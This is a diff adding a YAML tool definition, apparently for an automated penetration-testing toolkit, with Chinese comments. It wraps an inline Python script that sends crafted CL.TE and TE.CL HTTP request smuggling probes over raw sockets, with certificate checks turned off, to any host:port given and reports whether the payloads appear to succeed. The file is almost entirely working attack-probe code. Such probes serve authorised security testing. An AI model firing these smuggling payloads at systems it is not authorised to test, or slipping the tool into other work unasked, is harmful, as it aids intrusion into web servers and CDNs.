@@ -1,0 +1,88 @@
+name: "http-request-smuggler"
+command: "python3"
+args:
+  - "-c"
+  - |
+    import sys, json, socket, ssl, time
+    # HTTP 请求走私探测（CL.TE / TE.CL 基础探针）
+    # 用法：python3 -c '<script>' "<host:port>" "<use_https true|false>" "<additional_args>"
+    target = sys.argv[1] if len(sys.argv) > 1 else ""
+    use_https = (sys.argv[2].lower() == "true") if len(sys.argv) > 2 else False
+    if not target:
+        print(json.dumps({"error": "host:port required"}, ensure_ascii=False)); sys.exit(1)
+    host, _, port_s = target.partition(":")
+    port = int(port_s) if port_s else (443 if use_https else 80)
+    def send(payload, timeout=8):
+        try:
+            sock = socket.create_connection((host, port), timeout=timeout)
+            if use_https:
+                ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+                sock = ctx.wrap_socket(sock, server_hostname=host)
+            sock.sendall(payload)
+            time.sleep(2)
+            data = b""
+            sock.settimeout(timeout)
+            try:
+                while True:
+                    chunk = sock.recv(4096)
+                    if not chunk: break
+                    data += chunk
+                    if len(data) > 8192: break
+            except socket.timeout:
+                pass
+            sock.close()
+            return data
+        except Exception as e:
+            return ("ERR:" + str(e)).encode()
+    # CL.TE 探针：前端按 Content-Length，后端按 Transfer-Encoding
+    cl_te = (
+        "POST / HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "Content-Length: 13\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "\r\n"
+        "0\r\n"
+        "\r\n"
+        "SMUGGLED" % host
+    ).encode()
+    # TE.CL 探针
+    te_cl = (
+        "POST / HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "Content-Length: 3\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "\r\n"
+        "8\r\n"
+        "SMUGGLED\r\n"
+        "0\r\n"
+        "\r\n" % host
+    ).encode()
+    r1 = send(cl_te)
+    r2 = send(te_cl)
+    findings = []
+    for tag, r in [("CL.TE", r1), ("TE.CL", r2)]:
+        if b"SMUGGLED" in r or (b"ERR:" in r and b"timeout" in r.lower()):
+            findings.append({"vector": tag, "likely_smuggling": b"SMUGGLED" in r, "response_snippet": r[:300].decode("utf-8","ignore")})
+    print(json.dumps({"findings": findings}, ensure_ascii=False, indent=2))
+    sys.exit(0 if findings else 1)
+parameters:
+  - name: "target"
+    type: "string"
+    description: "目标 host:port（如 example.com:443）"
+    required: true
+    position: 1
+    format: "positional"
+  - name: "use_https"
+    type: "string"
+    description: "是否 HTTPS：true | false（默认 false）"
+    required: false
+    position: 2
+    format: "positional"
+    default: "false"
+  - name: "additional_args"
+    type: "string"
+    description: "额外参数"
+    required: false
+    format: "positional"
+enabled: true
+short_description: "HTTP 请求走私探测（CL.TE / TE.CL），CDN 前置时重点探，命中即高危"
